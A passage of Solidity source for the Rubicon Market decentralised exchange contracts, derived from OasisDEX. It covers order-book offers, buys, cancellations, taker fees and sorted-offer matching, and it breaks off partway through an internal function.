indexed taker,\n        uint128 take_amt,\n        uint128 give_amt,\n        uint64 timestamp\n    );\n\n    event LogKill(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogInt(string lol, uint256 input);\n\n    event FeeTake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        ERC20 asset,\n        address indexed taker,\n        address feeTo,\n        uint256 feeAmt,\n        uint64 timestamp\n    );\n\n    event OfferDeleted(uint256 id);\n}\n\n/// @notice Core trading logic for ERC-20 pairs, an orderbook, and transacting of tokens\n/// @dev This contract holds the core ERC-20 / ERC-20 offer, buy, and cancel logic\ncontract SimpleMarket is EventfulMarket, DSMath {\n    uint256 public last_offer_id;\n\n    /// @dev The mapping that makes up the core orderbook of the exchange\n    mapping(uint256 => OfferInfo) public offers;\n\n    bool locked;\n\n    /// @dev This parameter is in basis points\n    uint256 internal feeBPS;\n\n    /// @dev This parameter provides the address to which fees are sent\n    address internal feeTo;\n\n    struct OfferInfo {\n        uint256 pay_amt;\n        ERC20 pay_gem;\n        uint256 buy_amt;\n        ERC20 buy_gem;\n        address owner;\n        uint64 timestamp;\n    }\n\n    /// @notice Modifier that insures an order exists and is properly in the orderbook\n    modifier can_buy(uint256 id) virtual {\n        require(isActive(id));\n        _;\n    }\n\n    /// @notice Modifier that checks the user to make sure they own the offer and its valid before they attempt to cancel it\n    modifier can_cancel(uint256 id) virtual {\n        require(isActive(id));\n        require(getOwner(id) == msg.sender);\n        _;\n    }\n\n    modifier can_offer() virtual {\n        _;\n    }\n\n    modifier synchronized() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function isActive(uint256 id) public view returns (bool active) {\n        return offers[id].timestamp > 0;\n    }\n\n    function getOwner(uint256 id) public view returns (address owner) {\n        return offers[id].owner;\n    }\n\n    function getOffer(uint256 id)\n        public\n        view\n        returns (\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        OfferInfo memory _offer = offers[id];\n        return (_offer.pay_amt, _offer.pay_gem, _offer.buy_amt, _offer.buy_gem);\n    }\n\n    /// @notice Below are the main public entrypoints\n\n    function bump(bytes32 id_) external can_buy(uint256(id_)) {\n        uint256 id = uint256(id_);\n        emit LogBump(\n            id_,\n            keccak256(abi.encodePacked(offers[id].pay_gem, offers[id].buy_gem)),\n            offers[id].owner,\n            offers[id].pay_gem,\n            offers[id].buy_gem,\n            uint128(offers[id].pay_amt),\n            uint128(offers[id].buy_amt),\n            offers[id].timestamp\n        );\n    }\n\n    /// @notice Accept a given `quantity` of an offer. Transfers funds from caller/taker to offer maker, and from market to caller/taker.\n    /// @notice The fee for taker trades is paid in this function.\n    function buy(uint256 id, uint256 quantity)\n        public\n        virtual\n        can_buy(id)\n        synchronized\n        returns (bool)\n    {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        // Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 10000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend),\n            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that you can pay the fee\"\n        );\n        require(\n            _offer.pay_gem.transfer(msg.sender, quantity),\n            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\"\n        );\n\n        emit LogItemUpdate(id);\n        emit LogTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            msg.sender,\n            uint128(quantity),\n            uint128(spend),\n            uint64(block.timestamp)\n        );\n        emit FeeTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.buy_gem,\n            msg.sender,\n            feeTo,\n            fee,\n            uint64(block.timestamp)\n        );\n        emit LogTrade(\n            quantity,\n            address(_offer.pay_gem),\n            spend,\n            address(_offer.buy_gem)\n        );\n\n        if (offers[id].pay_amt == 0) {\n            delete offers[id];\n            emit OfferDeleted(id);\n        }\n\n        return true;\n    }\n\n    /// @notice Allows the caller to cancel the offer if it is their own.\n    /// @notice This function refunds the offer to the maker.\n    function cancel(uint256 id)\n        public\n        virtual\n        can_cancel(id)\n        synchronized\n        returns (bool success)\n    {\n        OfferInfo memory _offer = offers[id];\n        delete offers[id];\n\n        require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogKill(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            uint128(_offer.pay_amt),\n            uint128(_offer.buy_amt),\n            uint64(block.timestamp)\n        );\n\n        success = true;\n    }\n\n    function kill(bytes32 id) external virtual {\n        require(cancel(uint256(id)));\n    }\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) external virtual returns (bytes32 id) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    /// @notice Key function to make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(0x0));\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(0x0));\n        require(pay_gem != buy_gem);\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.owner = msg.sender;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogMake(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt),\n            uint64(block.timestamp)\n        );\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) external virtual {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function _next_id() internal returns (uint256) {\n        last_offer_id++;\n        return last_offer_id;\n    }\n\n    // Fee logic\n    function getFeeBPS() internal view returns (uint256) {\n        return feeBPS;\n    }\n}\n\n/// @notice Expiring market is a Simple Market with a market lifetime.\n/// @dev When the close_time has been reached, offers can only be cancelled (offer and buy will throw).\ncontract ExpiringMarket is DSAuth, SimpleMarket {\n    bool public stopped;\n\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, anyone can cancel an offer.\n    modifier can_cancel(uint256 id) virtual override {\n        require(isActive(id));\n        require((msg.sender == getOwner(id)) || isClosed());\n        _;\n    }\n\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n\n    function getTime() public view returns (uint64) {\n        return uint64(block.timestamp);\n    }\n\n    function stop() external auth {\n        stopped = true;\n    }\n}\n\ncontract DSNote {\n    event LogNote(\n        bytes4 indexed sig,\n        address indexed guy,\n        bytes32 indexed foo,\n        bytes32 indexed bar,\n        uint256 wad,\n        bytes fax\n    ) anonymous;\n\n    modifier note() {\n        bytes32 foo;\n        bytes32 bar;\n        uint256 wad;\n\n        assembly {\n            foo := calldataload(4)\n            bar := calldataload(36)\n            wad := callvalue()\n        }\n\n        emit LogNote(msg.sig, msg.sender, foo, bar, wad, msg.data);\n\n        _;\n    }\n}\n\ncontract MatchingEvents {\n    event LogBuyEnabled(bool isEnabled);\n    event LogMinSell(address pay_gem, uint256 min_amount);\n    event LogMatchingEnabled(bool isEnabled);\n    event LogUnsortedOffer(uint256 id);\n    event LogSortedOffer(uint256 id);\n    event LogInsert(address keeper, uint256 id);\n    event LogDelete(address keeper, uint256 id);\n    event LogMatch(uint256 id, uint256 amount);\n}\n\n/// @notice The core Rubicon Market smart contract\n/// @notice This contract is based on the original open-source work done by OasisDEX under the Apache License 2.0\n/// @dev This contract inherits the key trading functionality from SimpleMarket\ncontract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {\n    bool public buyEnabled = true; //buy enabled\n    bool public matchingEnabled = true; //true: enable matching,\n    //false: revert to expiring market\n    /// @dev Below is variable to allow for a proxy-friendly constructor\n    bool public initialized;\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    bool public AqueductDistributionLive;\n    /// @dev unused deprecated variable for applying a token distribution of this token on top of a trade\n    address public AqueductAddress;\n\n    struct sortInfo {\n        uint256 next; //points to id of next higher offer\n        uint256 prev; //points to id of previous lower offer\n        uint256 delb; //the blocknumber where this entry was marked for delete\n    }\n    mapping(uint256 => sortInfo) public _rank; //doubly linked lists of sorted offer ids\n    mapping(address => mapping(address => uint256)) public _best; //id of the highest offer for a token pair\n    mapping(address => mapping(address => uint256)) public _span; //number of offers stored for token pair in sorted orderbook\n    mapping(address => uint256) public _dust; //minimum sell amount for a token to avoid dust offers\n    mapping(uint256 => uint256) public _near; //next unsorted offer id\n    uint256 public _head; //first unsorted offer id\n    uint256 public dustId; // id of the latest offer marked as dust\n\n    /// @dev Proxy-safe initialization of storage\n    function initialize(bool _live, address _feeTo) public {\n        require(!initialized, \"contract is already initialized\");\n        AqueductDistributionLive = _live;\n\n        /// @notice The market fee recipient\n        feeTo = _feeTo;\n\n        owner = msg.sender;\n        emit LogSetOwner(msg.sender);\n\n        /// @notice The starting fee on taker trades in basis points\n        feeBPS = 20;\n\n        initialized = true;\n        matchingEnabled = true;\n        buyEnabled = true;\n    }\n\n    // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() || msg.sender == getOwner(id) || id == dustId,\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n\n    // ---- Public entrypoints ---- //\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) public override returns (bytes32) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) public override {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function kill(bytes32 id) external override {\n        require(cancel(uint256(id)));\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    //\n    // If matching is enabled:\n    //     * creates new offer without putting it in\n    //       the sorted list.\n    //     * available to authorized contracts only!\n    //     * keepers should call insert(id,pos)\n    //       to put offer in the sorted list.\n    //\n    // If matching is disabled:\n    //     * calls expiring market's offer().\n    //     * available to everyone without authorization.\n    //     * no sorting is done.\n    //\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //taker (ask) buy how much\n        ERC20 buy_gem //taker (ask) buy which token\n    ) public override returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n\n\n            function(uint256, ERC20, uint256, ERC20) returns (uint256) fn\n         = matchingEnabled ? _offeru : super.offer;\n        return fn(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external can_offer returns (uint256) {\n        return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n    }\n\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos, //position to insert offer, 0 should be used if unknown\n        bool matching //match \"close enough\" orders?\n    ) public can_offer returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n        require(_dust[address(pay_gem)] <= pay_amt);\n\n        if (matchingEnabled) {\n            return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, matching);\n        }\n        return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    //Transfers funds from caller to offer maker, and from market to caller.\n    function buy(uint256 id, uint256 amount)\n        public\n        override\n        can_buy(id)\n        returns (bool)\n    {\n        require(!locked, \"Reentrancy attempt\");\n\n        //Optional distribution on trade\n        if (AqueductDistributionLive) {\n            IAqueduct(AqueductAddress).distributeToMakerAndTaker(\n                getOwner(id),\n                msg.sender\n            );\n        }\n        function(uint256, uint256) returns (bool) fn = matchingEnabled\n            ? _buys\n            : super.buy;\n\n        return fn(id, amount);\n    }\n\n    // Cancel an offer. Refunds offer maker.\n    function cancel(uint256 id)\n        public\n        override\n        can_cancel(id)\n        returns (bool success)\n    {\n        require(!locked, \"Reentrancy attempt\");\n        if (matchingEnabled) {\n            if (isOfferSorted(id)) {\n                require(_unsort(id));\n            } else {\n                require(_hide(id));\n            }\n        }\n        return super.cancel(id); //delete the offer.\n    }\n\n    //insert offer into the sorted list\n    //keepers need to use this function\n    function insert(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) public returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(!isOfferSorted(id)); //make sure offers[id] is not yet sorted\n        require(isActive(id)); //make sure offers[id] is active\n\n        _hide(id); //remove offer from unsorted offers list\n        _sort(id, pos); //put offer into the sorted offers list\n        emit LogInsert(msg.sender, id);\n        return true;\n    }\n\n    //deletes _rank [id]\n    //  Function should be called by keepers.\n    function del_rank(uint256 id) external returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(\n            !isActive(id) &&\n                _rank[id].delb != 0 &&\n                _rank[id].delb < block.number - 10\n        );\n        delete _rank[id];\n        emit LogDelete(msg.sender, id);\n        return true;\n    }\n\n    //set the minimum sell amount for a token\n    //    Function is used to avoid \"dust offers\" that have\n    //    very small amount of tokens to sell, and it would\n    //    cost more gas to accept the offer, than the value\n    //    of tokens received.\n    function setMinSell(\n        ERC20 pay_gem, //token to assign minimum sell amount to\n        uint256 dust //maker (ask) minimum sell amount\n    ) external auth note returns (bool) {\n        _dust[address(pay_gem)] = dust;\n        emit LogMinSell(address(pay_gem), dust);\n        return true;\n    }\n\n    //returns the minimum sell amount for an offer\n    function getMinSell(\n        ERC20 pay_gem //token for which minimum sell amount is queried\n    ) external view returns (uint256) {\n        return _dust[address(pay_gem)];\n    }\n\n    //set buy functionality enabled/disabled\n    function setBuyEnabled(bool buyEnabled_) external auth returns (bool) {\n        buyEnabled = buyEnabled_;\n        emit LogBuyEnabled(buyEnabled);\n        return true;\n    }\n\n    //set matching enabled/disabled\n    //    If matchingEnabled true(default), then inserted offers are matched.\n    //    Except the ones inserted by contracts, because those end up\n    //    in the unsorted list of offers, that must be later sorted by\n    //    keepers using insert().\n    //    If matchingEnabled is false then RubiconMarket is reverted to ExpiringMarket,\n    //    and matching is not done, and sorted lists are disabled.\n    function setMatchingEnabled(bool matchingEnabled_)\n        external\n        auth\n        returns (bool)\n    {\n        matchingEnabled = matchingEnabled_;\n        emit LogMatchingEnabled(matchingEnabled);\n        return true;\n    }\n\n    //return the best offer for a token pair\n    //      the best offer is the lowest one if it's an ask,\n    //      and highest one if it's a bid offer\n    function getBestOffer(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _best[address(sell_gem)][address(buy_gem)];\n    }\n\n    //return the next worse offer in the sorted list\n    //      the worse offer is the higher one if its an ask,\n    //      a lower one if its a bid offer,\n    //      and in both cases the newer one if they're equal.\n    function getWorseOffer(uint256 id) public view returns (uint256) {\n        return _rank[id].prev;\n    }\n\n    //return the next better offer in the sorted list\n    //      the better offer is in the lower priced one if its an ask,\n    //      the next higher priced one if its a bid offer\n    //      and in both cases the older one if they're equal.\n    function getBetterOffer(uint256 id) external view returns (uint256) {\n        return _rank[id].next;\n    }\n\n    //return the amount of better offers for a token pair\n    function getOfferCount(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _span[address(sell_gem)][address(buy_gem)];\n    }\n\n    //get the first unsorted offer that was inserted by a contract\n    //      Contracts can't calculate the insertion position of their offer because it is not an O(1) operation.\n    //      Their offers get put in the unsorted list of offers.\n    //      Keepers can calculate the insertion position offchain and pass it to the insert() function to insert\n    //      the unsorted offer into the sorted list. Unsorted offers will not be matched, but can be bought with buy().\n    function getFirstUnsortedOffer() public view returns (uint256) {\n        return _head;\n    }\n\n    //get the next unsorted offer\n    //      Can be used to cycle through all the unsorted offers.\n    function getNextUnsortedOffer(uint256 id) public view returns (uint256) {\n        return _near[id];\n    }\n\n    function isOfferSorted(uint256 id) public view returns (bool) {\n        return\n            _rank[id].next != 0 ||\n            _rank[id].prev != 0 ||\n            _best[address(offers[id].pay_gem)][address(offers[id].buy_gem)] ==\n            id;\n    }\n\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                pay_amt * 1 ether <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    pay_amt * 10**9,\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10**9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount);\n    }\n\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0);\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                buy_amt * 1 ether <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        buy_amt * 10**9,\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10**9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n        }\n        require(fill_amt <= max_fill_amount);\n    }\n\n    function getBuyAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 pay_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (pay_amt > offers[offerId].buy_amt) {\n            fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount to buy accumulator\n            pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to pay\n            if (pay_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                pay_amt * 10**9,\n                rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to buy accumulator\n    }\n\n    function getPayAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 buy_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (buy_amt > offers[offerId].pay_amt) {\n            fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount to pay accumulator\n            buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n            if (buy_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                buy_amt * 10**9,\n                rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to pay accumulator\n    }\n\n    // ---- Internal Functions ---- //\n\n    function _buys(uint256 id, uint256 amount) internal returns (bool) {\n        require(buyEnabled);\n        if (amount == offers[id].pay_amt) {\n            if (isOfferSorted(id)) {\n                //offers[id] must be removed from sorted list because all of it is bought\n                _unsort(id);\n            } else {\n                _hide(id);\n            }\n        }\n\n        require(super.buy(id, amount));\n\n        // If offer has become dust during buy, we cancel it\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n        return true;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _find(uint256 id) internal view returns (uint256) {\n        require(id > 0);\n\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        uint256 top = _best[pay_gem][buy_gem];\n        uint256 old_top = 0;\n\n        // Find the larger-than-id order whose successor is less-than-id.\n        while (top != 0 && _isPricedLtOrEq(id, top)) {\n            old_top = top;\n            top = _rank[top].prev;\n        }\n        return old_top;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _findpos(uint256 id, uint256 pos) internal view returns (uint256) {\n        require(id > 0);\n\n        // Look for an active order.\n        while (pos != 0 && !isActive(pos)) {\n            pos = _rank[pos].prev;\n        }\n\n        if (pos == 0) {\n            //if we got to the end of list without a single active offer\n            return _find(id);\n        } else {\n            // if we did find a nearby active offer\n            // Walk the order book down from there...\n            if (_isPricedLtOrEq(id, pos)) {\n                uint256 old_pos;\n\n                // Guaranteed to run at least once because of\n                // the prior if statements.\n                while (pos != 0 && _isPricedLtOrEq(id, pos)) {\n                    old_pos = pos;\n                    pos = _rank[pos].prev;\n                }\n                return old_pos;\n\n                // ...or walk it up.\n            } else {\n                while (pos != 0 && !_isPricedLtOrEq(id, pos)) {\n                    pos = _rank[pos].next;\n                }\n                return pos;\n            }\n        }\n    }\n\n    //return true if offers[low] priced less than or equal to offers[high]\n    function _isPricedLtOrEq(\n        uint256 low, //lower priced offer's id\n        uint256 high //higher priced offer's id\n    ) internal view returns (bool) {\n        return\n            mul(offers[low].buy_amt, offers[high].pay_amt) >=\n            mul(offers[high].buy_amt, offers[low].pay_amt);\n    }\n\n    //these variables are global only because of solidity local variable limit\n\n    //match offers with taker offer, and execute token transactions\n    function _matcho(\n        uint256 t_pay_amt, //taker sell how much\n        ERC20 t_pay_gem, //taker sell which token\n        uint256 t_buy_amt, //taker buy how much\n        ERC20 t_buy_gem, //taker buy which token\n        uint256 pos, //position id\n        bool rounding //match \"close enough\" orders?\n    ) internal returns (uint256 id) {\n        uint256 best_maker_id; //highest maker id\n        uint256 t_buy_amt_old; //taker buy how much saved\n        uint256 m_buy_amt; //maker offer wants to buy this much token\n        uint256 m_pay_amt; //maker offer wants to sell this much token\n\n        // there is at least one offer stored for token pair\n        while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n            best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n            m_buy_amt = offers[best_maker_id].buy_amt;\n            m_pay_amt = offers[best_maker_id].pay_amt;\n\n            // Ugly hack to work around rounding errors. Based on the idea that\n            // the furthest the amounts can stray from their \"true\" values is 1.\n            // Ergo the worst case has t_pay_amt and m_pay_amt at +1 away from\n            // their \"correct\" values and m_buy_amt and t_buy_amt at -1.\n            // Since (c - 1) * (d - 1) > (a + 1) * (b + 1) is equivalent to\n            // c * d > a * b + a + b + c + d, we write...\n            if (\n                mul(m_buy_amt, t_buy_amt) >\n                mul(t_pay_amt, m_pay_amt) +\n                    (\n                        rounding\n                            ? m_buy_amt + t_buy_amt + t_pay_amt + m_pay_amt\n                            : 0\n                    )\n            ) {\n                break;\n            }\n            // ^ The `rounding` parameter is a compromise borne of a couple days\n            // of discussion.\n            buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n            emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n            t_buy_amt_old = t_buy_amt;\n            t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n            t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n\n            if (t_pay_amt == 0 || t_buy_amt == 0) {\n                break;\n            }\n        }\n\n        if (\n            t_buy_amt > 0 &&\n            t_pay_amt > 0 &&\n            t_pay_amt >= _dust[address(t_pay_gem)]\n        ) {\n            //new offer should be created\n            id = super.offer(t_pay_amt, t_pay_gem, t_buy_amt, t_buy_gem);\n            //insert offer into the sorted list\n            _sort(id, pos);\n        }\n    }\n\n    // Make a new offer without putting it in the sorted list.\n    // Takes funds from the caller into market escrow.\n    // Keepers should call insert(id,pos) to put offer in the sorted list.\n    function _offeru(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem //maker (ask) buy which token\n    ) internal returns (uint256 id) {\n        require(_dust[address(pay_gem)] <= pay_amt);\n        id = super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n        _near[id] = _head;\n        _head = id;\n        emit LogUnsortedOffer(id);\n    }\n\n    //put offer into the sorted list\n    function _sort(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) internal {\n        require(isActive(id));\n\n        ERC20 buy_gem = offers[id].buy_gem;\n        ERC20 pay_gem = offers[id].pay_gem;\n        uint256 prev_id; //maker (ask) id\n\n        pos = pos == 0 ||\n            offers[pos].pay_gem != pay_gem ||\n            offers[pos].buy_gem != buy_gem ||\n            !isOfferSorted(pos)\n            ? _find(id)\n            : _findpos(id, pos);\n\n        if (pos != 0) {\n            //offers[id] is not the highest offer\n            //requirement below is satisfied by statements above\n            //require(_isPricedLtOrEq(id, pos));\n            prev_id = _rank[pos].prev;\n            _rank[pos].prev = id;\n            _rank[id].next = pos;\n        } else {\n            //offers[id] is the highest offer\n            prev_id = _best[address(pay_gem)][address(buy_gem)];\n            _best[address(pay_gem)][address(buy_gem)] = id;\n        }\n\n        if (prev_id != 0) {\n            //if lower offer does exist\n            //requirement below is satisfied by statements above\n            //require(!_isPricedLtOrEq(id, prev_id));\n            _rank[prev_id].next = id;\n            _rank[id].prev = prev_id;\n        }\n\n        _span[address(pay_gem)][address(buy_gem)]++;\n        emit LogSortedOffer(id);\n    }\n\n    // Remove offer from the sorted list (does not cancel offer)\n    function _unsort(\n        uint256 id //id of maker (ask) offer to remove from sorted list\n    ) internal returns (bool) {\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        require(_span[pay_gem][buy_gem] > 0);\n\n        require(\n            _rank[id].delb == 0 && //assert id is in the sorted list\n                isOfferSorted(id)\n        );\n\n        if (id != _best[pay_gem][buy_gem]) {\n            // offers[id] is not the highest offer\n            require(_rank[_rank[id].next].prev == id);\n            _rank[_rank[id].next].prev = _rank[id].prev;\n        } else {\n            //offers[id] is the highest offer\n            _best[pay_gem][buy_gem] = _rank[id].prev;\n        }\n\n        if (_rank[id].prev != 0) {\n            //offers[id] is not the lowest offer\n            require(_rank[_rank[id].prev].next == id);\n            _rank[_rank[id].prev].next = _rank[id].next;\n        }\n\n        _span[pay_gem][buy_gem]--;\n        